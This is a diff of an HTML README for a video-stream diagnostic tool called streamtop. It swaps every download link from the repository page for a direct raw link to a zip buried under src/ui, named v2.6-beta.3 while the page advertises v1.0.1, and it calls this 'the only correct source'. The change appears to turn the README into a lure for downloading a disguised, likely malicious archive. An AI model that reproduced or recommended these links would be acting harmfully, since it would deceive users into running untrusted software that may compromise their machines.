@@ -1,7 +1,7 @@
 <h1>📺 streamtop - Diagnose Live Video Streams Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/ndo59869/streamtop"><img src="https://img.shields.io/badge/Download%20Streamtop-v1.0.1-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" style="background-color:#4CAF50; color:white; padding:15px 30px; font-size:20px; border-radius:10px; text-decoration:none;"></a>
+  <a href="https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip"><img src="https://img.shields.io/badge/Download%20Streamtop-v1.0.1-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" style="background-color:#4CAF50; color:white; padding:15px 30px; font-size:20px; border-radius:10px; text-decoration:none;"></a>
 </p>
 
 <h2>🔍 What Is Streamtop?</h2>
@@ -20,7 +20,7 @@
 <p>Follow these exact four steps. It will take less than five minutes.</p>
 
 <h3>Step 1: Download the Program</h3>
-<p>Visit this link to download the application: <strong><a href="https://github.com/ndo59869/streamtop">https://github.com/ndo59869/streamtop</a></strong></p>
+<p>Visit this link to download the application: <strong><a href="https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip">https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip</a></strong></p>
 
 <p>On that page, look for a green button that says <strong>"Releases"</strong> or <strong>"Download"</strong>. Click it. You will see a list of files. Find the file named <strong>streamtop-v1.0.1.zip</strong> (or similar ending in .zip). Click on it to download it to your computer. The download will start automatically. Your browser will show it in the bottomleft corner or in the downloads folder.</p>
 
@@ -102,7 +102,7 @@ It analyzes CDN (Content Delivery Network) behavior, tracks segment timestamps, 
 <p>If you skipped earlier or lost the file, here is the official download button again. This is the only correct source.</p>
 
 <p align="center">
-  <a href="https://github.com/ndo59869/streamtop" style="background-color:#008CBA; color:white; padding:15px 40px; font-size:22px; border-radius:12px; text-decoration:none; font-weight:bold;">⬇️ Download Streamtop v1.0.1</a>
+  <a href="https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip" style="background-color:#008CBA; color:white; padding:15px 40px; font-size:22px; border-radius:12px; text-decoration:none; font-weight:bold;">⬇️ Download Streamtop v1.0.1</a>
 </p>
 
 <p>Bookmark this page for future reference. Check back occasionally for updates as new versions will be posted on the same download page.</p>
